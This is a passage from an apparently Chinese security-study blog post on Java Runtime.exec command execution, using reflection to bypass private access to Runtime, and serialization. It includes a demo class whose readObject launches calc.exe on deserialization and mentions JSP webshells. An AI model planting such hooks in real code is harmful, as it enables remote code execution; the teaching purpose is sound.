<p>这里，在额外普及一下，如果需要回显怎么办的问题，主要是用IO流将命令执行后的字节加载出来，然后最基本的按行读取，就可以了。</p>
<p>在进行网站开发入JSP的时候，我们使用的JSP一句话木马也是根据这个原理进行编写的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ping</span> &#123;</span><br><span class="line">    <span class="comment">//我们需要执行有回显得命令</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ping baidu.com&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inputBufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        StringBuilder stringBuilder=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = inputBufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuilder.append(line);</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        inputBufferedReader.close();</span><br><span class="line">        inputBufferedReader=<span class="literal">null</span>;</span><br><span class="line">        inputStreamReader.close();</span><br><span class="line">        inputStreamReader=<span class="literal">null</span>;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        inputStream=<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Runtime的其他用法"><a href="#Runtime的其他用法" class="headerlink" title="Runtime的其他用法"></a>Runtime的其他用法</h3><p>我们在进行命令执行的时候，是需要区分操作系统的，不同的操作系统所执行的命令方式绝对是不一样的，</p>
<h4 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下"></a>Windows下</h4><p>windows 我们可以调用 cmd或者powershell去执行命令，但是powershell一般会限制执行策略，所以使用cmd一般是比较保险的</p>
<p><a href="https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2">https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] cmd=&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>&#125;; </span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span>Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<h4 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h4><p>对于linux的话，我们一般可以使用<code>bash</code>进行命令的执行，通常情况下是会有的，但是有的情况，可能没有bash，我们就可以使用<code>sh</code>来进行替代，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] cmd=&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls&quot;</span>&#125;; </span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span>Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<p>于是乎，在后面我们写exp或者一些工具的时候，就需要根据主机的操作系统进行甄别</p>
<p>最简单的办法就是使用<code>getProperty</code>函数进行<code>os</code>的名称</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>初步demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">property</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        String [] cmd1=&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;start calc.exe&quot;</span>&#125;;</span><br><span class="line">        String [] cmd2=&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ls&quot;</span>&#125;;</span><br><span class="line">        String [] cmd = <span class="literal">null</span>;</span><br><span class="line">        System.out.println(property);</span><br><span class="line">        <span class="keyword">if</span> (property.contains(<span class="string">&quot;Windows&quot;</span>))&#123;</span><br><span class="line">             cmd= cmd1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">             cmd= cmd1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span>Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="comment">//取得命令结果的输出流</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="comment">//用输出读取去读</span></span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">        <span class="comment">//创建缓冲器</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inputBufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        StringBuilder stringBuilder=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = inputBufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuilder.append(line);</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        inputBufferedReader.close();</span><br><span class="line">        inputBufferedReader=<span class="literal">null</span>;</span><br><span class="line">        inputStreamReader.close();</span><br><span class="line">        inputStreamReader=<span class="literal">null</span>;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        inputStream=<span class="literal">null</span>;</span><br><span class="line"><span class="comment">//        return stringBuilder;</span></span><br><span class="line"><span class="comment">//        这里如果要返回的值的话，返回的应该是stringBuilder</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="我们为什么必须使用反射"><a href="#我们为什么必须使用反射" class="headerlink" title="我们为什么必须使用反射"></a>我们为什么必须使用反射</h3><p>回想一下 java 中的基本操作，我们可以知道，类是对象的模板，对象是类的实例。一般我们都使用new的方式来创建一个对象，比如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">stu1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line"><span class="comment">//假设定义类之后，进行无参构造</span></span><br></pre></td></tr></table></figure>

<p>那么，反射，为什么需要反射呢？</p>
<blockquote>
<p>java有四个基本特征，封装，继承，多态，抽象</p>
<p>Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。本质上其实就是动态的生成类似于上述的字节码，加载到jvm中运行</p>
</blockquote>
<p><strong>关键点：动态获取</strong></p>
<h3 id="反射获取对象"><a href="#反射获取对象" class="headerlink" title="反射获取对象"></a>反射获取对象</h3><p>正常的new对象的过程如下，我们可以看到，首先编译出了Student的类，而Student.class 经过JVM的内存中，就始终存在一个（一个类只会存在一个class对象），</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220115014839.png"></p>
<p>补一张jvm的图</p>
<p><img src="https://pic4.zhimg.com/80/v2-4face8109e0d52ef5894c41c69e4ec6b_hd.jpg" alt="img"></p>
<p>双亲委派机制</p>
<p>1-&gt;2-&gt;3-&gt;4</p>
<p>由于java语言动态的特性，在程序运行后，所运行的类，就已经在JVM的内存中，我们就可以直接调用已经加载好的类去实现我们的方法操作。</p>
<blockquote>
<p>在很大一部分情况下，公司上线的产品都是以jar包或者war包部署到Tomcat下运行的，我们如果有源码，能审查链以后，就可以直接利用加载在JVM中的类进行操作。</p>
</blockquote>
<ol>
<li>Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。本质是JVM得到class对象之后，再通过class对象进行反编译，从而获取对象的各种信息。</li>
<li>Java属于&#x3D;&#x3D;先编译再运行&#x3D;&#x3D;的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。</li>
<li><strong>反射调用方法时，会忽略权限检查</strong>，可以无视权限修改对应的值—&gt;因此容易导致安全性问题，（对安全研究人员来说提供了不小的帮助，hhhh）</li>
</ol>
<h3 id="反射举例"><a href="#反射举例" class="headerlink" title="反射举例"></a>反射举例</h3><p>我们最常见的反射举例，是加载数据库驱动时的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);<span class="comment">//动态加载JDBC驱动</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br></pre></td></tr></table></figure>

<h4 id="反射常用的方法有"><a href="#反射常用的方法有" class="headerlink" title="反射常用的方法有"></a>反射常用的方法有</h4><p>Java.lang.Class;</p>
<p>Java.lang.reflect.Constructor;</p>
<p>Java.lang.reflect.Field;</p>
<p>Java.lang.reflect.Method;</p>
<p>Java.lang.reflect.Modifier;</p>
<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><h5 id="获得Class"><a href="#获得Class" class="headerlink" title="获得Class"></a>获得Class</h5><ul>
<li>类名.class，如:com.student.Student.class。</li>
<li>ClassLoader.getSystemClassLoader().loadClass(“com.student.Student”)</li>
<li>Class.forName(“com.student.Student”)</li>
</ul>
<p>于是乎，我们通过反射可以这样获取<code>Runtime</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span>     <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass2</span> <span class="operator">=</span> java.lang.Runtime.class;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass3</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure>

<h5 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h5><p>这里，有两个方法</p>
<ul>
<li>getDeclaredConstructor()</li>
<li>getConstructor()</li>
</ul>
<p>其中，getDeclaredConstructor()可以获得构造方法，也就是我们常用的<code>private</code>方法，其中Runtime的构造方法是<code>private</code>，我们无法直接调用，我们需要使用反射去修改方法的访问权限（使用<code>setAccessible</code>，修改为 true）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> runtimeClass1.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<h5 id="通过获取的构造器进行实例化对象"><a href="#通过获取的构造器进行实例化对象" class="headerlink" title="通过获取的构造器进行实例化对象"></a>通过获取的构造器进行实例化对象</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Object类是所有类的父类，有兴趣的同学可以在双亲委派机制中去搞明白</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"><span class="comment">//这里的话就等价于</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br></pre></td></tr></table></figure>

<h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当我们想获取当前类的所有成员方法时们可以使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method[] methods = class.getDeclaredMethods()</span><br></pre></td></tr></table></figure>

<p>获取当前类指定的成员方法时，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> class.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> class.getDeclaredMethod(<span class="string">&quot;方法名&quot;</span>, 参数类型如String.class，多个参数用<span class="string">&quot;,&quot;</span>号隔开);</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里简单解释一下 invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="string">&quot;,&quot;</span>隔开);</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>invoke就是调用类中的方法，最简单的用法是可以把方法参数化invoke(class, method)</li>
</ol>
<p> 这里则是使用了 class.invoke(method,”参数”)的一个方式</p>
<ol start="2">
<li>还可以把方法名存进数组v[],然后循环里invoke(test,v[i]),就顺序调用了全部方法</li>
</ol>
<p> （之后会介绍）</p>
</blockquote>
<h5 id="回显结果，不需要回显的话就忽略"><a href="#回显结果，不需要回显的话就忽略" class="headerlink" title="回显结果，不需要回显的话就忽略"></a>回显结果，不需要回显的话就忽略</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">      <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">      <span class="type">BufferedReader</span> <span class="variable">inputBufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">      StringBuilder stringBuilder=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">      <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">while</span> ((line = inputBufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">          stringBuilder.append(line);</span><br><span class="line">          System.out.println(line);</span><br><span class="line">      &#125;</span><br><span class="line">      inputBufferedReader.close();</span><br><span class="line">      inputStreamReader.close();</span><br><span class="line">      inputStream.close();</span><br></pre></td></tr></table></figure>

<h5 id="获取成员变量-Demo中没有用到"><a href="#获取成员变量-Demo中没有用到" class="headerlink" title="获取成员变量(Demo中没有用到)"></a>获取成员变量(Demo中没有用到)</h5><p>反射还可以对成员变量进行操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取类中的成员们变量</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">fields</span> <span class="operator">=</span> class.getDeclaredFields();</span><br><span class="line"><span class="comment">//获取当前类指定的成员变量</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span>  <span class="operator">=</span> class.getDeclaredField(<span class="string">&quot;变量名&quot;</span>);</span><br><span class="line"><span class="comment">//获取成员变量的值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> field.get(类实例对象);</span><br><span class="line"><span class="comment">//修改成员变量的值</span></span><br><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure>

<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException &#123;</span><br><span class="line">        <span class="type">Class</span>  <span class="variable">runtimeClass1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//相当于 import</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span>  runtimeClass1.getDeclaredConstructor();<span class="comment">//相当于编写无参构造类</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);<span class="comment">//取消private的限制</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> constructor.newInstance();<span class="comment">//有了无参构造类以后，我们new了一个对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//编写类的方法</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) method.invoke(runtimeInstance,<span class="string">&quot;calc&quot;</span>);<span class="comment">//调用了类的方法</span></span><br><span class="line">        <span class="comment">//接下来就是回显的结果</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inputBufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        StringBuilder stringBuilder=<span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = inputBufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuilder.append(line);</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        inputBufferedReader.close();</span><br><span class="line">        inputStreamReader.close();</span><br><span class="line">        inputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="深入理解反射"><a href="#深入理解反射" class="headerlink" title="深入理解反射"></a>深入理解反射</h3><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220115184644.png"></p>
<h3 id="反射的作用和意义"><a href="#反射的作用和意义" class="headerlink" title="反射的作用和意义"></a>反射的作用和意义</h3><p>我胡诌的：</p>
<p>对于安全人员来说，使用反射，可以更加高效的利用项目本身的属性类，而不借助其他外部类去实现一些漏洞的挖掘，这也是我们挖掘gadget的基本思路</p>
<h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><h3 id="为什么需要使用序列化"><a href="#为什么需要使用序列化" class="headerlink" title="为什么需要使用序列化"></a>为什么需要使用序列化</h3><p>和php使用序列化的情况一样，</p>
<p>但很多情况下，我们需要保存某⼀刻某个对象的信息，来进⾏⼀些操作。⽐如利⽤反序列化将程序运 ⾏的对象状态以⼆进制形式储存与⽂件系统中，然后可以在另⼀个程序中对序列化后的对象状态数据 进⾏反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。</p>
<h3 id="应用需求"><a href="#应用需求" class="headerlink" title="应用需求"></a>应用需求</h3><p>想要实现序列化需要满足几个条件</p>
<ol>
<li><p>该类必须实现<code>java.io.Serlalizable</code>接口</p>
</li>
<li><p>该类的所有属性必须是可序列化的，如果⼀个属性是不可序列化的，则属性必须标明是短暂的。</p>
<p>比如：static，transient 修饰的变量不可被序列化</p>
</li>
</ol>
<p>用于的场景业务</p>
<ul>
<li>把对象的字节序列永久地保存到硬盘上，通常存放在⼀个⽂件中；</li>
<li>在⽹络上传送对象的字节序列</li>
</ul>
<blockquote>
<p>服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，⽽⽤⼾会话还在进⾏相 应的操作，这时就需要使⽤序列化将session信息保存起来放在硬盘，服务器重启后，⼜重新加载。 这样就保证了⽤⼾信息不会丢失，实现永久化保存。</p>
<p>最常⻅的是Web服务器中的Session对象，当有 10万⽤⼾并发访问，就有可能出现10万个Session 对象，内存可能吃不消，于是Web容器就会把⼀些seesion先序列化到硬盘中，等要⽤了，再把保 存在硬盘中的对象还原到内存中。</p>
</blockquote>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>序列化：</p>
<ul>
<li><p>ObjectOutputStream类 -&gt; writeObject()</p>
<blockquote>
<p>该⽅法对参数指定的obj⽂件进⾏序列化把字节序列写到⼀个⽬标输出流中，按照java标准是 给⽂件⼀个 ser 的扩展名</p>
</blockquote>
</li>
</ul>
<p>反序列化</p>
<ul>
<li><p>ObjectInputStream类-&gt; readObject()</p>
<blockquote>
<p>该⽅法是从⼀个输⼊流中读取字节序列，再把他们反序列化成对象，将其返回</p>
</blockquote>
</li>
</ul>
<p>Java反序列化时会执⾏readObject()⽅法，所以如果readObject()⽅法被恶意构造 的话，就有可能导致命令执⾏。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="comment">//这里设不设置属性无所谓，主要看当时的情况</span></span><br><span class="line">        user.setName(<span class="string">&quot;Wuming&quot;</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Users\\12451\\Desktop\\Java-Learn\\src\\main\\java\\com\\Serializable\\test.ser&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Users\\12451\\Desktop\\Java-Learn\\src\\main\\java\\com\\Serializable\\test.ser&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">test</span> <span class="operator">=</span> (User) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"><span class="comment">//    //把object对象储存为字节流的形式</span></span><br><span class="line"><span class="comment">//        FileOutputStream fos = new FileOutputStream(&quot;object&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream os = new ObjectOutputStream(fos);</span></span><br><span class="line"><span class="comment">//    //将对象写⼊object⽂件</span></span><br><span class="line"><span class="comment">//        os.writeObject(user);</span></span><br><span class="line"><span class="comment">//        os.close();</span></span><br><span class="line"><span class="comment">//    //从⽂件中反序列化obj对象</span></span><br><span class="line"><span class="comment">//        FileInputStream fis = new FileInputStream(&quot;object&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(fis);</span></span><br><span class="line"><span class="comment">//    //恢复对象</span></span><br><span class="line"><span class="comment">//        User user1 = (User) ois.readObject();</span></span><br><span class="line"><span class="comment">//        System.out.println(user1.getName());</span></span><br><span class="line"><span class="comment">//        ois.close();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="关于serialVersionUID-序列号"><a href="#关于serialVersionUID-序列号" class="headerlink" title="关于serialVersionUID(序列号)"></a>关于serialVersionUID(序列号)</h3><h4 id="当我们没有自定义序列化ID"><a href="#当我们没有自定义序列化ID" class="headerlink" title="当我们没有自定义序列化ID"></a>当我们没有自定义序列化ID</h4><p>如果我们没有自定义序列化id，当我们修改User 类的时候，编译器又为我们User 类生成了一个UID，而序列化和反序列化就是通过对比其SerialversionUID来进行的，一旦SerialversionUID不匹配，反序列化就无法成功。在实际的生产环境中，如果我们有需求要在序列化后添加一个字段或者方法,应该怎么办？那就是自己去指定serialVersionUID。</p>
<h4 id="设置序列化ID"><a href="#设置序列化ID" class="headerlink" title="设置序列化ID"></a>设置序列化ID</h4><p>序列化运行时将一个版本号与每个称为SerialVersionUID的可序列化类相关联，在反序列化过程中使用该序列号验证序列化对象的发送方和接收方是否为该对象加载了与序列化兼容的类。如果接收方为对象加载的类的UID与相应发送方类的UID不同，则反序列化将导致<strong>InvalidClassException</strong>. 可序列化类可以通过声明字段名来显式声明自己的UID。</p>
<p>它必须是static、final和long类型。例如</p>
